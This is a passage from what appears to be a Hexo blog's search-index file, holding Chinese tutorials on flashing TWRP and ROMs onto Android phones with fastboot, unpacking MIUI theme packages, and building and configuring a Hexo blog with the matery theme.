vbmeta.img到命令窗口，回车键确认，不要自做聪明删掉中间的空格符号等，请完整复制粘贴 到此VB刷入成功 然后接着向下看 刷入twrp1.刷入VB成功后，不要开机，不要关闭命令窗口，不要拔掉数据线 2.复制fastboot flash recovery twrp.img粘贴到命令窗口（请完整复制） 手机按音量减，上面的绿色文字START变成红色文字recovery mode这时按电源键确认。手机会重启到twrp 如果仍然为官方recovery请你检查你的手机与电脑连接是否正常，或者之前刷入过twrp 1.进入twrp后会弹出键盘，这时解密data分区，输入锁屏密码即可 2.解密成功后下一个界面直接滑动下面的滑块，不需要管上面的文字，因为我说了你也不一定懂（滑稽）直接滑动滑块就行了，到这个界面。 到此twrp刷入成功 4.进行四清以TWRP为例,把Dalvik.system.data.cache打钩,清除(如果刷完重启一直进rec或者一直重启，现在可以把能在rec的清除选项把能清的都清了)注:部分电脑在手机清除完数据无法打开手机目录,只需重启手机即可解决问题如果进rec没有自动帮你挂载文件,自己去挂载挂载第1,2个即可 把自己要刷的rom放进手机储存即可进行刷机 开机有谷歌验证的话 重启到recovery模式,清除cache和Dalvik,重启即可 想解锁system分区有解锁不了1.直接解决办法,刷机2.不一定在一些软件可用的解锁办法→1.root后打开mt管理器2.选择system文件夹,按住会有属性,点击,在权限那行点击更改3.把用户组的写打钩,点击确定即可 可以使用syslock查看system分区是否解锁 不推荐新手线刷教程:例:群文件MIUI11包一秒刷完1.解压刷机包2.把里面的system.img vendor.img boot.img 复制到fastboot工具文件夹3.确保手机与电脑的连接,输入以下指令fastboot flash vendor vendor.imgfastboot flash system system.imgfastboot flash boot boot.img完成后即可重启"},{"title":"玩机汇总（六）：MIUI主题拆包","path":"/post/f25.html","text":"开始教程（电脑）： 一：总概括1. 主题包大概所包含常用的模块：如下图： 2. 常用模块介绍：（1）.boots文件夹—开机动画。 （2）.fonts文件夹—字体。 （3）.preview文件夹—该主题的截图介绍。 （4）.wallpaper文件夹—锁屏壁纸和桌面壁纸。 （5）.clock_2*4模块—桌面时间样式。 （6）.com.android.contacts模块—拨号键盘样式。 （7）.com.android.mms模块—短信界面（气泡、字体颜色等）。 （8）.com.android.settings模块—设置（自定义设置名字、设置内容图标等）。 （9）.com.android.systemui模块—状态栏（背景、开关图标、自定义电池后文字、纵横排开关个数，自定义信号、WIFI、电池、蓝牙、静音、闹钟等图标）。 （10）.com.android.thememanger模块—主题中心（自定义主题商店的名字、背景、修改导入本地主题按钮名称等）。 （11）.com.android.updater模块—系统升级（系统更新背景图、自定义更新按钮名字等）。 （12）.com.miui.home模块—桌面布局（修改图标布局、图标大小等）。 （13）.com.android.securitycenter模块—安全中心（背景图）。 （14）.com.android.touchassistant模块—悬浮球（自定义悬浮球样式、颜色）。 （15）.com.tencent.mobileqq模块—默认QQ主题（修改QQ默认主题样式）。 （16）. description.xml****模块—主题信息（设计师名字、主题名字、主题介绍）。 （17）. framework-miui-res模块—全局背景（设置背景，短信背景、音量图、搜索栏背景图等）。 （18）.icons模块—图标 （19）. Lockscreen****模块—锁屏样式 3.所需工具：（1）.打开MTZ主题包工具：WINR压缩或者360压缩（选择MTZ文件右键选择压缩打开，里面的模块则用ctrl+enter组合键打开）。注：我用的360压缩！！！ *（2）.XML代码修改工具：***notepad++**（百度搜索下载）。 （3）.图片编辑器：PS或者其他（光影魔术手）。 *（4）.点九图软件：***Nine-PatchEditor 小技巧：****手机应用你需要修改的主题，电脑或手机打开主题文件对应着看！ 二．模块详细修改介绍（想替换的素材直接复制粘贴进主题包对应位置替换即可！名称或图片格式或大小相同即可。） （1）. boots文件夹—开机动画，如图：（都是用很多张图片组成开机动画） 附上网上开机动画制作教程（教程仅供参考）：http://www.miui.com/thread-571473-1-1.html http://www.xiaomi.cn/content-20-6690-1.html （2）. fonts文件夹—字体（打开后字体为ttf格式） （3）. preview文件夹—该主题的截图（格式：png）介绍，如图： 注：这只是随意的主题介绍图，主题商店的主题介绍图，名称都是对应的，区别请自己下载主题商店的主题拆包研究！ （4）. wallpaper文件夹—锁屏壁纸和桌面壁纸（格式：jpg） （5）. clock_2*4模块—桌面时间样式（一般没什么可以改的，有好看的时钟样式，直接替换就行） （6）. com.android.contacts模块—拨号键盘样式 注：拨号键盘背景图名称：dialer_background.9.png&#x2F; dialer_bottom_bar_bg.9.png （7）.com.android.mms模块—短信界面（气泡、字体颜色等） （8）.com.android.settings模块—设置（自定义设置名字、设置内容图标等） （9）. com.android.systemui模块—状态栏（背景、开关图标、自定义电池后文字、纵横排开关个数，自定义信号、WIFI、电池、蓝牙、静音、闹钟等图标） 信号，WiFi，电池等通知图标所在文件夹： 状态栏全背景图名字：notification_panel_bg.png 状态栏半背景图名字：notification_list_bg.9.png 清理背景图名字：recent_task_bg.9.png 注：需要修改的内容直接复制粘贴进去替换就行！ （10）.com.android.thememanger模块—主题中心（自定义主题商店的名字、背景、修改导入本地主题按钮名称等） 背景图名字：theme_window_background.9.png （11）.com.android.updater模块—系统升级（系统更新背景图、自定义更新按钮名字等）。 （12）.com.miui.home模块—桌面布局（修改图标布局、图标大小等） （13）.com.android.securitycenter模块—安全中心（背景图）。 （14）.com.android.touchassistant模块—悬浮球（自定义悬浮球样式、颜色）。 附上颜色代码查询表：http://yusi123.com/1090.html （16）. description.xml****模块—主题信息（设计师名字、主题名字、主题介绍）。 （17）. framework-miui-res模块—全局背景（设置背景，短信背景、音量图、搜索栏背景图等）。 （18）.icons模块—图标 （19）. Lockscreen****模块—锁屏样式 注：这个没什么好说的，好看的锁屏直接替换！！！ ​ 来自： 小米主题框架交流群：【Ⅰ群：534025609、Ⅱ群：107086533】 **—Mr.**阿傑！"},{"title":"个人博客搭建（1）：Hexo搭建个人博客部署到Github","path":"/post/a167.html","text":"本文介绍Hexo搭建个人博客部署到Github Hexo 是一个轻量、快速，简单和强大的博客框架，当我们需要发布博文的时候，只需要将写好的文章（MarkDown文件）放入本地的 \\source\\_posts 文件夹，然后再推送上去就行了，原理就是当我们在执行 hexo g 命令时，.md 文件就会被转化成 HTML 文件， 安装Hexo利用 npm 命令即可安装。在任意位置点击鼠标右键，选择Git Bash 输入命令：`npm install -g hexo ` -g是指全局安装hexo。 注：如果被”墙“，可使用淘宝 NPM 镜像 ` $ npm install -g cnpm --registry=https://registry.npm.taobao.org ` 使用淘宝NPM安装Hexo ` $ cnpm install -g hexo-cli ` 与原先的npm完全一样，只是命令改为cnpm,一样等待hexo安装完成出现的WARN可以不用理会继续输入以下命令 ` $ cnpm install hexo --save ` 检验` $ hexo -v ` 初始化Hexo创建文件夹 在Hexo文件下，右键运行Git Bash，输入命令：` hexo init ` 在_config.yml,进行基础配置 这里只列举了部分，其他可以根据自己要求更改 主题主题下载 可以选择更多主题，然后在Hexo文件夹下 Git Bash ` git clone https://github.com/iissnan/hexo-theme-nextthemes/next （next为主题名字），来获得更多主题 ` 并在_config.yml中更改 本地浏览博客 分别输入 如下命令： ` hexo g hexo s ` 更多命令 在浏览器输入：localhost：4000 ，就可以进行访问 写文章在我们放置博客文件的文件夹Hexo中，source&#x2F;_posts&#x2F;目录下存放着所有博文的Markdown文件，初始化只有一个hello-world.md文件。我们可以在Git Bash中创建新博文： ` hexo new &lt;title&gt; ` 在_posts目录下会生成相应的.md文件，接下来我们可以编辑该文件，直接写博文。（注意使用Markdown语法） 文章中头部内容 ` title: typora-vue-theme主题介绍 date: 2018-09-07 09:25:00 author: kif img: /source/images/xxx.jpg top: true cover: true coverImg: /images/1.jpg password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 toc: false mathjax: false summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要 categories: Markdown tags: - Typora - Markdown --- itle Markdown 的文件标题 文章标题，强烈建议填写此选项 date 文件创建时的日期时间 发布时间，强烈建议填写此选项，且最好保证全局唯一 author 根 _config.yml 中的 author 文章作者 img featureImages 中的某个值 文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: http://xxx.com/xxx.jpg top true 推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章 cover false v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中 coverImg 无 v1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片 password 无 文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项 toc true 是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项 mathjax false 是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行 summary 无 文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要 categories 无 文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类 tags 无 文章标签，一篇文章可以多个标签 keywords 文章标题 文章关键字，SEO 时需要 reprintPolicy cc_by 文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个 写完博文后，执行即可在博客中更新。 hexo g hexo d 如果要删除博文，则直接把_posts目录下相应的.md文件删除，再执行上述命令即可。 PS：关于在博文中插入图片 可以把图片统一放置在source/images目录下，然后在使用时用下述方式引用。 ![](/images/image.jpg) ` 部署到Github上申请Github账号new repository 然后点击 Create repository 在_config.yml进行配置 仓库地址 安装hexo-deployer-git自动部署发布工具` npm install hexo-deployer-git --save ` 发布到Github`hexo c hexo g hexo d"},{"title":"个人博客搭建（4）：matery 主题调教（持续更新...）","path":"/post/f390.html","text":"介绍：项目地址：hexo-theme-matery 是一个采用 Material Design 和响应式设计的 Hexo 博客主题。 主页： 下载：当你看到这里的时候，应该已经有一个自己的 Hexo 博客了。如果还没有的话，不妨使用 Hexo 和 Markdown 来写博客和文章。 点击 这里 下载 master 分支的最新稳定版的代码，解压缩后，将 hexo-theme-matery 的文件夹复制到你 Hexo 的 themes 文件夹中即可。 当然你也可以在你的 themes 文件夹下使用 Git clone 命令来下载: git clone https://github.com/blinkfox/hexo-theme-matery.git`&lt;/pre&gt; 会得到如下文件 ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814190654.png) # [](#配置 &quot;配置&quot;)配置 ## [](#切换 &quot;切换&quot;)切换 修改 Hexo **根目录下的 `_config.yml`** （注意区分更目录下的config和主题文件下的config）的 `theme` 的值：`theme: hexo-theme-matery` （如果你重命名下载的文件的话就改为重命名后的名字，此教程已重命名为matery） ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814190510.png) ## [](#新建分类-categories-页 &quot;新建分类 categories 页&quot;)新建分类 categories 页 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210041.png) categories即主页顶部”分类：点击所要跳转的页面 `categories` 页是用来展示所有分类的页面，如果在你的博客 `source` 目录下还没有 `categories/index.md` 文件，那么你就需要新建一个，命令如下： &lt;pre&gt;`hexo new page &quot;categories&quot;`&lt;/pre&gt; 编辑你刚刚新建的页面文件 `/source/categories/index.md`，写入以下内容： &lt;pre&gt;`--- title: categories date: 2018-09-30 17:25:30 type: &quot;categories&quot; layout: &quot;categories&quot; ---`&lt;/pre&gt; ## [](#新建标签-tags-页 &quot;新建标签 tags 页&quot;)新建标签 tags 页 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210005.png) `about` 页是用来展示**关于我和我的博客**信息的页面，如果在你的博客 `source` 目录下还没有 `about/index.md` 文件，那么你就需要新建一个，命令如下： &lt;pre&gt;`hexo new page &quot;about&quot;`&lt;/pre&gt; 编辑你刚刚新建的页面文件 `/source/about/index.md`，至少需要以下内容： &lt;pre&gt;`--- title: about date: 2018-09-30 17:25:30 type: &quot;about&quot; layout: &quot;about&quot; ---`&lt;/pre&gt; ## [](#新建留言板-contact-页 &quot;新建留言板 contact 页&quot;)新建留言板 contact 页 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814205915.png) `contact` 页是用来展示**留言板**信息的页面，如果在你的博客 `source` 目录下还没有 `contact/index.md` 文件，那么你就需要新建一个，命令如下： &lt;pre&gt;`hexo new page &quot;contact&quot;`&lt;/pre&gt; 编辑你刚刚新建的页面文件 `/source/contact/index.md`，至少需要以下内容： &lt;pre&gt;`--- title: contact date: 2018-09-30 17:25:30 type: &quot;contact&quot; layout: &quot;contact&quot; ---`&lt;/pre&gt; ## [](#新建友情链接-friends-页 &quot;新建友情链接 friends 页&quot;)新建友情链接 friends 页 `friends` 页是用来展示**友情链接**信息的页面，如果在你的博客 `source` 目录下还没有 `friends/index.md` 文件，那么你就需要新建一个，命令如下： &lt;pre&gt;`hexo new page &quot;friends&quot;`&lt;/pre&gt; 编辑你刚刚新建的页面文件 `/source/friends/index.md`，至少需要以下内容： &lt;pre&gt;`--- title: friends date: 2018-12-12 21:25:30 type: &quot;friends&quot; layout: &quot;friends&quot; ---`&lt;/pre&gt; 同时，在你的博客 `source` 目录下新建 `_data` 目录，在 `_data` 目录中新建 `friends.json` 文件， ![image-20200814202349576](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814202349.png) 文件内容如下所示： &lt;pre&gt;`[&#123; &quot;avatar&quot;: &quot;https://s1.ax1x.com/2020/06/23/NUr8pQ.jpg&quot;, &quot;name&quot;: &quot;kif&quot;, &quot;introduction&quot;: &quot;就是本人啦！&quot;, &quot;url&quot;: &quot;https://kifroom.icu/&quot;, &quot;title&quot;: &quot;前去学习&quot; &#125;, &#123; &quot;avatar&quot;: &quot;头像地址&quot;, &quot;name&quot;: &quot;名字&quot;, &quot;introduction&quot;: &quot;介绍&quot;, &quot;url&quot;: &quot;网址&quot;, &quot;title&quot;: &quot;前去学习&quot; &#125;]`&lt;/pre&gt; 后期添加就在这儿添加就可以了 ### [](#友链信息声明： &quot;友链信息声明：&quot;)友链信息声明： 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814212249.png) `/source/friends/index.md`文件内填写即可 ## [](#新建-404-页 &quot;新建 404 页&quot;)新建 404 页 如果在你的博客 `source` 目录下还没有 `404.md` 文件，那么你就需要新建一个 编辑你刚刚新建的页面文件 `/source/404.md`，至少需要以下内容： &lt;pre&gt;`--- title: 404 date: 2018-09-30 17:25:30 type: &quot;404&quot; layout: &quot;404&quot; description: &quot;Oops～，我崩溃了！找不到你想要的页面 :(&quot; ---`&lt;/pre&gt; 这是默认的404，之后会介绍加入不受主题渲染的网页，届时可以自己写喜欢的404网页 效果： ![](https://cdn.jsdelivr.net/gh/wkif/ImageHosting/img/20200814205755.png) ## [](#菜单导航配置 &quot;菜单导航配置&quot;)菜单导航配置 ### [](#配置基本菜单导航的名称、路径url和图标icon &quot;配置基本菜单导航的名称、路径url和图标icon.&quot;)配置基本菜单导航的名称、路径url和图标icon. 1.菜单导航名称可以是中文也可以是英文(如：`Index`或`主页`) 2.图标icon 可以在[Font Awesome](https://fontawesome.com/icons) 中查找 &lt;pre&gt;`menu: Index: url: / icon: fas fa-home Tags: url: /tags icon: fas fa-tags Categories: url: /categories icon: fas fa-bookmark Archives: url: /archives icon: fas fa-archive About: url: /about icon: fas fa-user-circle Friends: url: /friends icon: fas fa-address-book`&lt;/pre&gt; ### [](#二级菜单配置方法 &quot;二级菜单配置方法&quot;)二级菜单配置方法 如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作 1.在需要添加二级菜单的一级菜单下添加`children`关键字(如:`About`菜单下添加`children`) 2.在`children`下创建二级菜单的 名称name,路径url和图标icon. 3.注意每个二级菜单模块前要加 `-`. 4.注意缩进格式 &lt;pre&gt;`menu: Index: url: / icon: fas fa-home Tags: url: /tags icon: fas fa-tags Categories: url: /categories icon: fas fa-bookmark Archives: url: /archives icon: fas fa-archive About: url: /about icon: fas fa-user-circle-o Friends: url: /friends icon: fas fa-address-book Medias: icon: fas fa-list children: - name: Musics url: /musics icon: fas fa-music - name: Movies url: /movies icon: fas fa-film - name: Books url: /books icon: fas fa-book - name: Galleries url: /galleries icon: fas fa-image`&lt;/pre&gt; 执行 `hexo clean &amp;amp;&amp;amp; hexo g` 重新生成博客文件，然后就可以在文章中对应位置看到你用`emoji`语法写的表情了。 ## [](#配置gitalk评论 &quot;配置gitalk评论&quot;)配置gitalk评论 效果： ![](https://cdn.jsdelivr.net/gh/wkif/ImageHosting/img/20200814205633.png) 教程：[个人博客搭建（2）:配置gitalk评论](https://kifroom.icu/posts/4.html) ## [](#代码高亮 &quot;代码高亮&quot;)代码高亮 由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 [hexo-prism-plugin](https://github.com/ele828/hexo-prism-plugin) 的 Hexo 插件来做代码高亮，安装命令如下： &lt;pre&gt;`npm i -S hexo-prism-plugin`&lt;/pre&gt; 然后，修改 Hexo 根目录下 `_config.yml` 文件中 `highlight.enable` 的值为 `false`，并新增 `prism` 插件相关的配置，主要配置如下： &lt;pre&gt;`highlight: enable: false prism_plugin: mode: &#39;preprocess&#39; # realtime/preprocess theme: &#39;tomorrow&#39; line_number: false # default false custom_css:`&lt;/pre&gt; ## [](#搜索 &quot;搜索&quot;)搜索 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210129.png) 本主题中还使用到了 [hexo-generator-search](https://github.com/wzpan/hexo-generator-search) 的 Hexo 插件来做内容搜索，安装命令如下： &lt;pre&gt;`npm install hexo-generator-search --save`&lt;/pre&gt; 在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项： &lt;pre&gt;`search: path: search.xml field: post`&lt;/pre&gt; ## [](#中文链接转拼音（建议安装） &quot;中文链接转拼音（建议安装）&quot;)中文链接转拼音（建议安装） 如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 `SEO`，且 `gitment` 评论对中文链接也不支持。我们可以用 [hexo-permalink-pinyin](https://github.com/viko16/hexo-permalink-pinyin) Hexo 插件使在生成文章时生成中文拼音的永久链接。 安装命令如下： &lt;pre&gt;`npm i hexo-permalink-pinyin --save`&lt;/pre&gt; 在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项： &lt;pre&gt;`permalink_pinyin: enable: true separator: &#39;-&#39; # default: &#39;-&#39;`&lt;/pre&gt;&gt; **注**：除了此插件外，[hexo-abbrlink](https://github.com/rozbo/hexo-abbrlink) 插件也可以生成非中文的链接。 ## [](#文章字数统计插件（建议安装） &quot;文章字数统计插件（建议安装）&quot;)文章字数统计插件（建议安装） 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210200.png) 如果你想要在文章中显示文章字数、阅读时长信息，可以安装 [hexo-wordcount](https://github.com/willin/hexo-wordcount)插件。 安装命令如下： &lt;pre&gt;`npm i --save hexo-wordcount`&lt;/pre&gt; 然后只需在本主题下的 `_config.yml` 文件中，将各个文章字数相关的配置激活即可： &lt;pre&gt;`postInfo: date: true update: false wordCount: false # 设置文章字数统计为 true. totalCount: false # 设置站点文章总字数统计为 true. min2read: false # 阅读时长. readCount: false # 阅读次数.`&lt;/pre&gt; ## [](#添加emoji表情支持（可选的） &quot;添加emoji表情支持（可选的）&quot;)添加emoji表情支持（可选的） 本主题新增了对`emoji`表情的支持，使用到了 [hexo-filter-github-emojis](https://npm.taobao.org/package/hexo-filter-github-emojis) 的 Hexo 插件来支持 `emoji`表情的生成，把对应的`markdown emoji`语法（`::`,例如：`:smile:`）转变成会跳跃的`emoji`表情，安装命令如下： &lt;pre&gt;`npm install hexo-filter-github-emojis --save`&lt;/pre&gt; 在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项： &lt;pre&gt;`githubEmojis: enable: true className: github-emoji inject: true styles: customEmojis:`&lt;/pre&gt; ## [](#添加-RSS-订阅支持（可选的） &quot;添加 RSS 订阅支持（可选的）&quot;)添加 RSS 订阅支持（可选的） 本主题中还使用到了 [hexo-generator-feed](https://github.com/hexojs/hexo-generator-feed) 的 Hexo 插件来做 `RSS`，安装命令如下： &lt;pre&gt;`npm install hexo-generator-feed --save`&lt;/pre&gt; 在 Hexo 根目录下的 `_config.yml` 文件中，新增以下的配置项： &lt;pre&gt;`feed: type: atom path: atom.xml limit: 20 hub: content: content_limit: 140 content_limit_delim: &#39; &#39; order_by: -date`&lt;/pre&gt; 执行 `hexo clean &amp;amp;&amp;amp; hexo g` 重新生成博客文件，然后在 `public` 文件夹中即可看到 `atom.xml` 文件，说明你已经安装成功了。 ## [](#添加-DaoVoice-在线聊天功能（可选的） &quot;添加 DaoVoice 在线聊天功能（可选的）&quot;)添加 [DaoVoice](http://www.daovoice.io/) 在线聊天功能（可选的） 前往 [DaoVoice](http://www.daovoice.io/) 官网注册并且获取 `app_id`，并将 `app_id` 填入主题的 `_config.yml` 文件中。 ## [](#添加-Tidio-在线聊天功能（可选的） &quot;添加 Tidio 在线聊天功能（可选的）&quot;)添加 [Tidio](https://www.tidio.com/) 在线聊天功能（可选的） 前往 [Tidio](https://www.tidio.com/) 官网注册并且获取 `Public Key`，并将 `Public Key` 填入主题的 `_config.yml` 文件中。 ## [](#修改页脚 &quot;修改页脚&quot;)修改页脚 效果： ![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814210231.png) 页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 `/layout/_partial/footer.ejs` 文件中，包括站点、使用的主题、访问量等。 ## [](#修改社交链接 &quot;修改社交链接&quot;)修改社交链接 在主题的 `_config.yml` 文件中，默认支持 `QQ`、`GitHub` 和邮箱等的配置，你可以在主题文件的 `/layout/_partial/social-link.ejs` 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码： &lt;pre&gt;`&amp;lt;% if (theme.socialLink.github) &#123; %&amp;gt; &amp;lt;a href=&quot;&amp;lt;%= theme.socialLink.github %&amp;gt;&quot; class=&quot;tooltipped&quot; target=&quot;_blank&quot; data-tooltip=&quot;访问我的GitHub&quot; data-position=&quot;top&quot; data-delay=&quot;50&quot;&amp;gt; &amp;lt;i class=&quot;fab fa-github&quot;&amp;gt;&amp;lt;/i&amp;gt; &amp;lt;/a&amp;gt; &amp;lt;% &#125; %&amp;gt;`&lt;/pre&gt; 其中，社交图标（如：`fa-github`）你可以在 [Font Awesome](https://fontawesome.com/icons) 中搜索找到。以下是常用社交图标的标识，供你参考： Facebook: fab fa-facebook Twitter: fab fa-twitter Google-plus: fab fa-google-plus Linkedin: fab fa-linkedin Tumblr: fab fa-tumblr Medium: fab fa-medium Slack: fab fa-slack Sina Weibo: fab fa-weibo Wechat: fab fa-weixin QQ: fab fa-qq Zhihu: fab fa-zhihu 注意: 本主题中使用的 Font Awesome 版本为 5.11.0。 修改打赏的二维码图片效果： 在主题文件的 source/medias/reward 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。 配置音乐播放器（可选的）效果： 要支持音乐播放，在主题的 _config.yml 配置文件中激活music配置即可： `# 是否在首页显示音乐 music: enable: true title: # 非吸底模式有效 enable: true show: 听听音乐 server: netease # require music platform: netease, tencent, kugou, xiami, baidu type: playlist # require song, playlist, album, search, artist id: 503838841 # require song id / playlist id / album id / search keyword fixed: false # 开启吸底模式 autoplay: false # 是否自动播放 theme: '#42b983' loop: 'all' # 音频循环播放, 可选值: 'all', 'one', 'none' order: 'random' # 音频循环顺序, 可选值: 'list', 'random' preload: 'auto' # 预加载，可选值: 'none', 'metadata', 'auto' volume: 0.7 # 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效 listFolded: true # 列表默认折叠`> `server`可选`netease`（网易云音乐），`tencent`（QQ音乐），`kugou`（酷狗音乐），`xiami`（虾米音乐）， `baidu`（百度音乐）。 `type`可选`song`（歌曲），`playlist`（歌单），`album`（专辑），`search`（搜索关键字），`artist`（歌手） &lt;pre&gt;`id`获取方法示例: 浏览器打开网易云音乐，点击我喜欢的音乐歌单，浏览器地址栏后面会有一串数字，`playlist`的`id`&lt;/pre&gt; 即为这串数字。 ## [](#文章-Front-matter-介绍 &quot;文章 Front-matter 介绍&quot;)文章 Front-matter 介绍 ### [](#Front-matter-选项详解 &quot;Front-matter 选项详解&quot;)Front-matter 选项详解 `Front-matter` 选项中的所有内容均为**非必填**的。但我仍然建议至少填写 `title` 和 `date` 的值。 &lt;table&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;配置选项&lt;/th&gt; &lt;th&gt;默认值&lt;/th&gt; &lt;th&gt;描述&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt;&lt;tr&gt; &lt;td&gt;title&lt;/td&gt; &lt;td&gt;`Markdown` 的文件标题&lt;/td&gt; &lt;td&gt;文章标题，强烈建议填写此选项&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;date&lt;/td&gt; &lt;td&gt;文件创建时的日期时间&lt;/td&gt; &lt;td&gt;发布时间，强烈建议填写此选项，且最好保证全局唯一&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;author&lt;/td&gt; &lt;td&gt;根 `_config.yml` 中的 `author`&lt;/td&gt; &lt;td&gt;文章作者&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;img&lt;/td&gt; &lt;td&gt;`featureImages` 中的某个值&lt;/td&gt; &lt;td&gt;文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: `http://xxx.com/xxx.jpg`&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;top&lt;/td&gt; &lt;td&gt;`true`&lt;/td&gt; &lt;td&gt;推荐文章（文章是否置顶），如果 `top` 值为 `true`，则会作为首页推荐文章&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;cover&lt;/td&gt; &lt;td&gt;`false`&lt;/td&gt; &lt;td&gt;`v1.0.2`版本新增，表示该文章是否需要加入到首页轮播封面中&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;coverImg&lt;/td&gt; &lt;td&gt;无&lt;/td&gt; &lt;td&gt;`v1.0.2`版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;password&lt;/td&gt; &lt;td&gt;无&lt;/td&gt; &lt;td&gt;文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 `password` 的值，该值必须是用 `SHA256` 加密后的密码，防止被他人识破。前提是在主题的 `config.yml` 中激活了 `verifyPassword` 选项&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;toc&lt;/td&gt; &lt;td&gt;`true`&lt;/td&gt; &lt;td&gt;是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 `config.yml` 中激活了 `toc` 选项&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;mathjax&lt;/td&gt; &lt;td&gt;`false`&lt;/td&gt; &lt;td&gt;是否开启数学公式支持 ，本文章是否开启 `mathjax`，且需要在主题的 `_config.yml` 文件中也需要开启才行&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;summary&lt;/td&gt; &lt;td&gt;无&lt;/td&gt; &lt;td&gt;文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;categories&lt;/td&gt; &lt;td&gt;无&lt;/td&gt; &lt;td&gt;文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;tags&lt;/td&gt; &lt;td&gt;无&lt;/td&gt; &lt;td&gt;文章标签，一篇文章可以多个标签&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;keywords&lt;/td&gt; &lt;td&gt;文章标题&lt;/td&gt; &lt;td&gt;文章关键字，SEO 时需要&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;reprintPolicy&lt;/td&gt; &lt;td&gt;cc_by&lt;/td&gt; &lt;td&gt;文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt; &gt; **注意**: 如果 img 属性不填写的话，文章特色图会根据文章标题的 hashcode 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图各有特色。 date 的值尽量保证每篇文章是唯一的，因为本主题中 Gitalk 和 Gitment 识别 id 是通过 date 的值来作为唯一标识的。 如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 _config.yml 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：开源中国在线工具、chahuo、站长工具。 您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则 以下为文章的 `Front-matter` 示例。 ### [](#最简示例 &quot;最简示例&quot;)最简示例 &lt;pre&gt;`--- title: typora-vue-theme主题介绍 date: 2018-09-07 09:25:00 ---`&lt;/pre&gt; ### [](#最全示例 &quot;最全示例&quot;)最全示例 &lt;pre&gt;`--- title: typora-vue-theme主题介绍 date: 2020-09-07 09:25:00 author: kif img: /source/images/xxx.jpg top: true cover: true coverImg: /images/1.jpg password: 123456 toc: false mathjax: false summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要 categories: Markdown tags: - Typora - Markdown 